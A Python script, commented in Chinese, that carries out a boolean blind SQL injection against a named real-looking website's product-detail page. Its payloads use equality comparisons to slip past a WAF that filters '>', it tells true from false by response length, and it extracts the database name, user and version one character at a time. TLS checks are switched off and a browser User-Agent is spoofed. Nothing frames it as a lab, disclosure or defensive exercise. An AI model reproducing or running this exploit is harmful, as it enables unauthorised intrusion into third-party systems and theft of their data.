#!/usr/bin/env python3
"""yijing_eq_dump.py - yijingweb.com 等值盲注(=绕过WAF的>拦截)
通道: id=687' and if(ascii(substr(expr,i,1))=N,687,0)#
"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

TRUE_LEN = 22800  # 真值基线(substr('abc',1,1)='a' → 22800)
FALSE_LEN = 22660  # 假值基线

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        b = r.read(60000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        b = e.read(60000).decode('utf-8','ignore')
    except Exception:
        return None
    if 'WTS-WAF' in b:
        return None
    if 'Invalid SQL' in b or 'MySQL Error' in b:
        return None  # 报错(可能是>被转义)
    return len(b) > 22700  # 真>22700, 假<22700

def test_eq(cond):
    """测试等值条件, 返回True/False/None"""
    return q("687' and if(%s,687,0)#" % cond)

def get_len(expr):
    """等值爆破长度: length(expr)=N"""
    for n in range(1, 65):
        r = test_eq("length(%s)=%d" % (expr, n))
        if r is True:
            return n
        if r is None:
            return None
    return None

def get_char(expr, pos, charset):
    """等值爆破单字符: ascii(substr(expr,pos,1))=N"""
    for ch in charset:
        n = ord(ch)
        r = test_eq("ascii(substr(%s,%d,1))=%d" % (expr, pos, n))
        if r is True:
            return ch
    return None

def dump(expr, name, charset, maxlen=64):
    print('[%s] 提取...' % name, flush=True)
    ln = get_len(expr)
    print('[%s] length=%s' % (name, ln), flush=True)
    if not ln:
        return '?'
    s = ''
    for i in range(1, ln+1):
        c = get_char(expr, i, charset)
        s += c if c else '?'
        if i % 8 == 0:
            print('  [%s] %d/%d: %s' % (name, i, ln, s), flush=True)
    print('[%s] = %s' % (name, s), flush=True)
    return s

if __name__ == '__main__':
    # 验证通道
    t = test_eq("1=1")
    f = test_eq("1=2")
    print('通道: 真=%s 假=%s' % (t, f), flush=True)
    if t is not True or f is not False:
        print('通道不稳定', flush=True)
        sys.exit(1)
    print('=== 等值盲注通道OK ===', flush=True)

    # 字符集: 常见优先
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ@.-'

    db = dump('database()', 'database', charset, 32)
    user = dump('user()', 'user', charset, 32)
    ver = dump('version()', 'version', charset, 32)

    print('\n=== 结果 ===', flush=True)
    print('database:', db, flush=True)
    print('user:', user, flush=True)
    print('version:', ver, flush=True)
